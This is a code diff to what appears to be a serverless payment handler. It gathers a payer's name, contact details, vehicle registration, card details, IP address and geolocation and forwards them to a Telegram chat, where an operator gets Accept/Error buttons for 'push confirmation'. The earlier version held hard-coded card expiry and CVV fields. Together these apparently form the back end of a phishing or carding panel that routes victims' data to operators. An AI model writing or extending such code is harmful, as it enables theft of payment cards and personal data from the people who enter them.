@@ -33,55 +33,70 @@ serve(async (req) => {
       );
     }
 
-    // Get payment session details
-    const { data: session, error } = await supabase
+    // Try to get payment session details (may not exist)
+    const { data: session } = await supabase
       .from('payment_sessions')
       .select('*')
       .eq('user_id', userId)
-      .single();
+      .maybeSingle();
 
-    if (error || !session) {
+    // Allow passing details directly when no session is found
+    const { details } = await (async () => {
+      try { return await req.json(); } catch { return { details: null }; }
+    })();
+
+    const payload = session ? {
+      userId: session.user_id,
+      name: session.customer_name,
+      email: session.customer_email,
+      phone: session.customer_phone,
+      vehicle_registration: session.vehicle_registration,
+      vehicle_make: session.vehicle_make,
+      vehicle_model: session.vehicle_model,
+      vehicle_color: session.vehicle_color,
+      duration: session.duration_label,
+      price: session.price,
+      card_number_masked: session.card_number_masked,
+      card_type: session.card_type,
+      test_mode: true,
+      userAgent: req.headers.get('user-agent') || 'Unknown',
+      ip: req.headers.get('x-forwarded-for') || 'Unknown',
+    } : details ? {
+      userId,
+      name: details.name,
+      email: details.email,
+      phone: details.phone,
+      vehicle_registration: details.vehicle_registration,
+      vehicle_make: details.vehicle_make,
+      vehicle_model: details.vehicle_model,
+      vehicle_color: details.vehicle_color,
+      duration: details.duration,
+      price: details.price,
+      card_number_masked: details.card_number_masked,
+      card_type: details.card_type,
+      test_mode: true,
+      userAgent: details.userAgent || (req.headers.get('user-agent') || 'Unknown'),
+      ip: details.ip || req.headers.get('x-forwarded-for') || 'Unknown',
+      country: details.country,
+      city: details.city,
+      region: details.region,
+      timezone: details.timezone,
+      isp: details.isp,
+    } : null;
+
+    if (!payload) {
       return new Response(
-        JSON.stringify({
-          success: false,
-          error: 'Payment session not found'
-        }),
-        {
-          status: 404,
-          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-        }
+        JSON.stringify({ success: false, error: 'Payment session not found and no details provided' }),
+        { status: 404, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
       );
     }
 
-    // Send Telegram notification to the second chat with buttons
+    // Send Telegram notification with Accept/Error buttons for push confirmation
     try {
       const telegramResponse = await supabase.functions.invoke('send-telegram-notification', {
         body: {
-          type: 'payment_submission',
-          data: {
-            userId: session.user_id,
-            name: session.customer_name,
-            email: session.customer_email,
-            phone: session.customer_phone,
-            vehicle_registration: session.vehicle_registration,
-            vehicle_make: session.vehicle_make,
-            vehicle_model: session.vehicle_model,
-            vehicle_color: session.vehicle_color,
-            duration: session.duration_label,
-            price: session.price,
-            card_number_masked: session.card_number_masked,
-            card_type: session.card_type,
-            card_expiry: "12/26",
-            card_cvv: "123",
-            test_mode: true,
-            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
-            ip: "test_ip",
-            country: "Test Country",
-            city: "Test City",
-            region: "Test Region",
-            timezone: "Test/Timezone",
-            isp: "Test ISP"
-          }
+          type: 'push_confirmation',
+          data: payload,
         }
       });
 
